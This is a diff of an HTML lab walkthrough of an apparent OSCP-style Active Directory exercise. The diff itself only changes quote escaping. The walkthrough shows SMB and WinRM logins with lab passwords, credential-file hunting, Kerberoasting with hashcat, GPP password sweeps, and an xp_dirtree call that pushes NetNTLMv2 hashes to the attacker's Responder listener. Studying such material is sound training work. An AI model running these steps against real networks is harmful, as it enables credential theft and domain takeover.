@@ -421,7 +421,7 @@ notes and is therefore not reconstructed here. <code>eric.wallows</code> is the 
 the same password still works, which is itself a finding.</p>
 <hr />
 <h3>1.3 First contact with MS02</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>web_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Diamond1&#39;</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>web_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">'Diamond1'</span><span class="w"> </span>--shares
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SMB  10.10.152.142  445  MS02  [*] Windows 10 / Server 2019 Build 19041 x64
                                   (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:None)
@@ -489,7 +489,7 @@ not the shell — it is proving what the token does <strong>not</strong> contain
 falls here or somewhere else.</p>
 <hr />
 <h3>2.1 The connection</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">'7k8XHk3dMtmpnC7'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Evil-WinRM shell v3.9
 Warning: Remote path completions is disabled due to ruby limitation
@@ -565,11 +565,11 @@ credential hunting:</p>
   was already proven empty on MS01 in the previous leg.</li>
 </ul>
 <p>So the runbook here is files, not memory:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">type </span><span class="s2">&quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">type </span><span class="s2">"$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"</span>
 <span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
-<span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Unattend&quot;</span> <span class="p">/</span><span class="n">s</span>
+<span class="n">reg</span> <span class="n">query</span> <span class="s2">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Unattend"</span> <span class="p">/</span><span class="n">s</span>
 <span class="nb">Get-ChildItem</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">celia</span><span class="p">.</span><span class="n">almeda</span> <span class="n">-Recurse</span> <span class="o">-File</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="p">|</span>
-  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span> <span class="n">-in</span> <span class="s1">&#39;.txt&#39;</span><span class="p">,</span><span class="s1">&#39;.xml&#39;</span><span class="p">,</span><span class="s1">&#39;.config&#39;</span><span class="p">,</span><span class="s1">&#39;.ini&#39;</span><span class="p">,</span><span class="s1">&#39;.ps1&#39;</span> <span class="p">}</span> <span class="p">|</span>
+  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span> <span class="n">-in</span> <span class="s1">'.txt'</span><span class="p">,</span><span class="s1">'.xml'</span><span class="p">,</span><span class="s1">'.config'</span><span class="p">,</span><span class="s1">'.ini'</span><span class="p">,</span><span class="s1">'.ps1'</span> <span class="p">}</span> <span class="p">|</span>
   <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="n">40</span> <span class="n">FullName</span>
 </pre></div>
 <p>Those are candidates, not results — nothing from that list is yet confirmed, and this chapter does not
@@ -626,12 +626,12 @@ account gives the mirror image:</p>
 <p>Two independent domain accounts, both with a SQL login on the same instance.</p>
 <hr />
 <h3>3.2 The only question that matters</h3>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">);</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">);</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-   -
 0   0</span></pre></div>
 <p>And as celia:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SQL</span><span class="w"> </span><span class="p">(</span><span class="n">OSCP</span><span class="err">\</span><span class="n">celia</span><span class="p">.</span><span class="n">almeda</span><span class="w">  </span><span class="n">guest</span><span class="o">@</span><span class="n">master</span><span class="p">)</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">);</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SQL</span><span class="w"> </span><span class="p">(</span><span class="n">OSCP</span><span class="err">\</span><span class="n">celia</span><span class="p">.</span><span class="n">almeda</span><span class="w">  </span><span class="n">guest</span><span class="o">@</span><span class="n">master</span><span class="p">)</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">);</span>
 <span class="o">-</span><span class="w">   </span><span class="mi">0</span>
 </pre></div>
 <p>The decisive column is <code>IS_SRVROLEMEMBER('sysadmin')</code> — <strong><code>0</code> for both logins.</strong> Neither is a member of
@@ -750,8 +750,8 @@ that shows up in section 4.4, and it also tells you where to point the clock.</p
 <hr />
 <h3>4.2 What a domain user can read on a DC</h3>
 <p><code>eric.wallows</code> was carried over from the previous leg, and the password still works:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span>
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">'EricLikesRunning800'</span>
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">'EricLikesRunning800'</span><span class="w"> </span>--shares
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SMB  10.10.152.140  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64
                                   (name:DC01) (domain:oscp.exam) (signing:True)
@@ -775,7 +775,7 @@ recorded here as the highest-value unexamined surface.</p>
 work, if any, has to point at MS02.</p>
 <hr />
 <h3>4.3 Collecting the directory</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">'7k8XHk3dMtmpnC7'</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-dc<span class="w"> </span>DC01.oscp.exam<span class="w"> </span>-c<span class="w"> </span>All
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">INFO: Found AD domain: oscp.exam
@@ -803,11 +803,11 @@ needs a name, not an IP, so the collector fell back to NTLM against LDAP. It sti
 but a thinner one: session and local-group collection came back empty across all three computers
 (chapter 05).</p>
 <p>The fix is one line and it is the same fix the Kerberoast needs:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.152.140 DC01.oscp.exam oscp.exam&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">echo</span><span class="w"> </span><span class="s1">'10.10.152.140 DC01.oscp.exam oscp.exam'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
 </pre></div>
 <hr />
 <h3>4.4 Kerberoasting — and the two things that stopped it</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">'7k8XHk3dMtmpnC7'</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-request
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ServicePrincipalName   Name     MemberOf  PasswordLastSet              LastLogon
@@ -1181,9 +1181,9 @@ administrator on MS02, and no privilege-escalation primitives exist in this toke
 <p>Both remaining actions are blocked by the same pair of host misconfigurations, not by anything in the
 target:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## 1. name resolution - Kerberos needs a name, not an IP</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.152.140 DC01.oscp.exam oscp.exam&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'10.10.152.140 DC01.oscp.exam oscp.exam'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
 
-<span class="c1">## 2. clock skew - Kerberos rejects &gt;5 minutes&#39; drift</span>
+<span class="c1">## 2. clock skew - Kerberos rejects &gt;5 minutes' drift</span>
 sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">10</span>.10.152.140
 date<span class="w"> </span>-u
 </pre></div>
@@ -1282,7 +1282,7 @@ domain user — it is an account whose privileges on MS02 are unknown and may in
 <strong>2022-12-05</strong>, on a service account, which is the profile that cracks.</p>
 <hr />
 <h3>7.2 Action 1 — Roast it</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">'7k8XHk3dMtmpnC7'</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerb.txt
 
 hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerb.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
@@ -1291,14 +1291,14 @@ hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</
 chapter 04.</p>
 <p>If it cracks, the next test is whether <code>sql_svc</code> can log in over WinRM or SMB, and whether its token
 carries <code>SeImpersonate</code>:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;cracked&gt;&#39;</span>
-nxc<span class="w"> </span>smb<span class="w">   </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;cracked&gt;&#39;</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;cracked&gt;'</span>
+nxc<span class="w"> </span>smb<span class="w">   </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;cracked&gt;'</span><span class="w"> </span>--shares
 </pre></div>
 <p><code>SeImpersonate</code> on that account, plus a service already running as it, is the SYSTEM path on MS02.</p>
 <hr />
 <h3>7.3 Action 2 — The share nobody has opened</h3>
 <p><code>Users</code> is not a default share on a domain controller, and <code>eric.wallows</code> can read it.</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>//10.10.152.140/Users<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;oscp.exam%EricLikesRunning800&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; ls&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>//10.10.152.140/Users<span class="w"> </span>-U<span class="w"> </span><span class="s1">'oscp.exam%EricLikesRunning800'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse ON; ls'</span>
 </pre></div>
 <p>This is the highest-value <strong>unexamined</strong> surface in the engagement: a custom share holding user data,
 mounted on the DC, readable by a plain domain user. Scripts, config files and second credentials are the
@@ -1306,8 +1306,8 @@ usual occupants.</p>
 <hr />
 <h3>7.4 Action 3 — GPP sweep</h3>
 <p>Cheap, and it fails closed:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>-M<span class="w"> </span>gpp_password
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>-M<span class="w"> </span>gpp_autologin
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">'EricLikesRunning800'</span><span class="w"> </span>-M<span class="w"> </span>gpp_password
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">'EricLikesRunning800'</span><span class="w"> </span>-M<span class="w"> </span>gpp_autologin
 </pre></div>
 <p>A <code>cpassword</code> in <code>SYSVOL</code> decrypts with a published key, so any hit is immediate plaintext.</p>
 <hr />
@@ -1316,7 +1316,7 @@ nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.
 privilege at all, because <code>public</code> can execute it:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-v
 </pre></div>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\&lt;tun0-address&gt;\loot&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">'\\&lt;tun0-address&gt;\loot'</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 </pre></div>
 <p>The outbound authentication comes from the <strong>MSSQL service account</strong>, not from the SQL login that
 issued the query. Crack the NetNTLMv2 with <code>hashcat -m 5600</code>. Same target as 7.2, reached without
@@ -1325,7 +1325,7 @@ Kerberos — which makes it the fallback of choice while DNS and the clock are s
 <h3>7.6 Action 5 — Re-collect once Kerberos works</h3>
 <p>The graph in chapter 05 came from an NTLM fallback with <strong>zero</strong> session results. A Kerberos-backed
 collection may expose sessions and local group memberships this run could not see:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">'7k8XHk3dMtmpnC7'</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-dc<span class="w"> </span>DC01.oscp.exam<span class="w"> </span>-c<span class="w"> </span>All
 </pre></div>
 <p>Treat the empty session table as <strong>"not observed"</strong>, not "proven absent", until this runs.</p>
@@ -1394,7 +1394,7 @@ this version?" Version CVEs come last — most boxes are misconfigured, not unpa
 </pre></div>
 <p>If <code>161/udp</code> is open:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 </pre></div>
 <p>Then, on success, always:</p>
@@ -1411,7 +1411,7 @@ Descriptions are written for an internal audience and routinely name accounts an
 <h4>HTTP/HTTPS</h4>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
 <span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n"</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
 <span class="k">done</span>
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
@@ -1422,7 +1422,7 @@ feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class=
 <li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
 </ul>
 <h4>FTP</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
 </pre></div>
 <p>Try the account name as the password. Check for key material, configs, and backups in the data
@@ -1432,8 +1432,8 @@ directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> ac
 ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
 </pre></div>
 <h4>SMB</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
 nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 </pre></div>
 <hr />
@@ -1446,7 +1446,7 @@ escalation path depends on it.</p>
 <hr />
 <h3>Phase 5 — Local enumeration (Linux)</h3>
 <p>Send one script over one connection and read one report:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
